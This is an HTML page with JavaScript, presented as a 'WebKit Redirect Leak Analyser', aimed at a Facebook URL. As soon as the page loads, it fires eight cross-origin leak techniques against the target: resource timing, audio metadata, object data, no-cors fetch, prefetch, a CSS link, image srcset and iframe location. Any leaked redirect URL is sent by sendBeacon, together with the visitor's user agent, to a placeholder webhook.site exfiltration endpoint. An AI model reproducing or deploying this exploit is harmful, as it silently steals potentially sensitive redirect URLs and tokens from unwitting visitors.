<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset='utf-8' />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit Redirect Leak Researcher - Putra Mahardika</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff41;
            padding: 20px;
            line-height: 1.4;
        }

        .container {
            border: 1px solid #00ff41;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 0 10px #00ff41;
            max-width: 900px;
            margin: auto;
        }

        h2 {
            border-bottom: 1px solid #00ff41;
            padding-bottom: 10px;
            color: #fff;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .log-item {
            margin-bottom: 5px;
            border-left: 3px solid #333;
            padding-left: 10px;
            font-size: 11px;
            word-break: break-all;
        }

        .leak {
            color: #ff3e3e;
            font-weight: bold;
            border-left: 3px solid #ff3e3e;
            background: rgba(255, 62, 62, 0.1);
            padding: 5px 10px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }

        #status {
            font-weight: bold;
            color: #f1c40f;
            margin: 10px 0;
        }

        .method-tag {
            color: #3498db;
            font-weight: bold;
            font-size: 10px;
            background: #222;
            padding: 2px 5px;
            border-radius: 3px;
            margin-right: 5px;
        }
    </style>
</head>

<body>
    <div class="container">
        <h2>[!] WebKit Redirect Leak Analyser</h2>
        <p>Target: <span id="target_display" style="color: #3498db;"></span></p>
        <div id="status">[*] Ready. Waiting for trigger...</div>
        <hr style="border:0; border-top:1px solid #333;">
        <div id="logs"></div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const CONFIG = {
            target: 'https://fb.com/4', // Target URL
            exfil: 'https://webhook.site/YOUR-ID', // Ganti dengan URL exfil lu
            myOrigin: window.location.origin
        };

        document.getElementById('target_display').innerText = CONFIG.target;

        // --- CORE LOGIC ---
        function log(msg, isLeak = false) {
            const div = document.createElement('div');
            div.className = isLeak ? 'log-item leak' : 'log-item';
            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            document.getElementById('logs').prepend(div);
            console.log(msg);
        }

        function report(data, method) {
            if (!data || data === CONFIG.target || data === CONFIG.myOrigin + '/') return;
            
            log(`<span class="method-tag">${method}</span> ALERT: LEAK DETECTED!`, true);
            log(`DATA: ${data}`, true);

            navigator.sendBeacon(CONFIG.exfil, JSON.stringify({
                method: method,
                leaked_url: data,
                ua: navigator.userAgent
            }));
        }

        // --- BYPASS VECTORS ---
        async function startExploit() {
            log("[*] Injected bypass spices... Launching.");

            // Vector 1: Performance Observer (Classic)
            new PerformanceObserver((l) => {
                l.getEntries().forEach(e => {
                    if (e.name.startsWith('http') && e.name !== CONFIG.target) report(e.name, 'Resource-Timing');
                });
            }).observe({ entryTypes: ['resource'] });

            // Vector 2: Audio/Video Element Bypass (Sering bocor di WebKit)
            const audio = new Audio();
            audio.src = CONFIG.target;
            audio.addEventListener('loadedmetadata', () => {
                if (audio.currentSrc && audio.currentSrc !== CONFIG.target) {
                    report(audio.currentSrc, 'Audio-Metadata-Leak');
                }
            });

            // Vector 3: Object Data Attribute
            const obj = document.createElement('object');
            obj.data = CONFIG.target;
            obj.onload = () => { try { if(obj.data !== CONFIG.target) report(obj.data, 'Object-Attr'); } catch(e){} };
            document.body.appendChild(obj);

            // Vector 4: Fetch + Mode: No-Cors (Bypass beberapa filter)
            fetch(CONFIG.target, { mode: 'no-cors' }).then(r => {
                if(r.url && r.url !== CONFIG.target) report(r.url, 'Fetch-NoCors');
            }).catch(e => {
                const match = e.message.match(/https?:\/\/[^\s]+/);
                if(match) report(match[0], 'Fetch-Error-String');
            });

            // Vector 5: Link Prefetch (Bypass CSP pada beberapa versi Safari)
            const link = document.createElement('link');
            link.rel = 'prefetch';
            link.href = CONFIG.target;
            document.head.appendChild(link);

            // Vector 6: CSS Import Timing/Leak
            const style = document.createElement('link');
            style.rel = 'stylesheet';
            style.href = CONFIG.target;
            style.onload = () => log("[*] CSS Load Attempted");
            document.head.appendChild(style);

            // Vector 7: Image Srcset Leak
            const img = new Image();
            img.srcset = `${CONFIG.target} 1x`;
            img.onerror = (e) => {
                // Kadang error event mengandung source yang sudah ter-resolve
                if (img.currentSrc && img.currentSrc !== CONFIG.target) report(img.currentSrc, 'Img-Srcset');
            };

            // Vector 8: Iframe Name/Location Hack
            const ifr = document.createElement('iframe');
            ifr.style.display = 'none';
            ifr.src = CONFIG.target;
            ifr.onload = () => {
                try {
                    const leak = ifr.contentWindow.location.href;
                    if(leak !== 'about:blank') report(leak, 'Iframe-SOP-Bypass');
                } catch(e) {}
            };
            document.body.appendChild(ifr);
        }

        // --- INITIALIZER ---
        window.onload = () => {
            setTimeout(() => {
                document.getElementById('status').innerText = "[+] Spices Injected. Analysing...";
                document.getElementById('status').style.color = "#00ff41";
                startExploit();
            }, 500);
        };
    </script>
</body>

</html>
